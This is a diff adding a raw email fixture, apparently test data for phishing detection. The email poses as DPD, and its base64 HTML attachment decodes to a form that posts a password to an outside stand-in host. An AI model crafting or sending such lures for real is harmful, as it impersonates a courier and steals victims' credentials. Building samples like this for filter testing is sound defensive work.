@@ -1,0 +1,25 @@
+From: "DPD" <info@pay-confirm56.test>
+To: victim@example.test
+Subject: DPD secure document
+Date: Thu, 05 Nov 2026 10:00:00 +0000
+Message-ID: <5007747456@pay-confirm56.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============0520121148425544951=="
+
+--===============0520121148425544951==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Please view this message in an HTML-capable client.
+
+--===============0520121148425544951==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="secure.html"
+MIME-Version: 1.0
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwczovL3BvcnRhbC1pZDg0LnRlc3QvYyIgbWV0
+aG9kPSJwb3N0Ij5EUEQ8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPjwvZm9ybT48c2Ny
+aXB0PmRvY3VtZW50LnRpdGxlPSJ4Ijwvc2NyaXB0PjwvYm9keT48L2h0bWw+
+
+--===============0520121148425544951==--
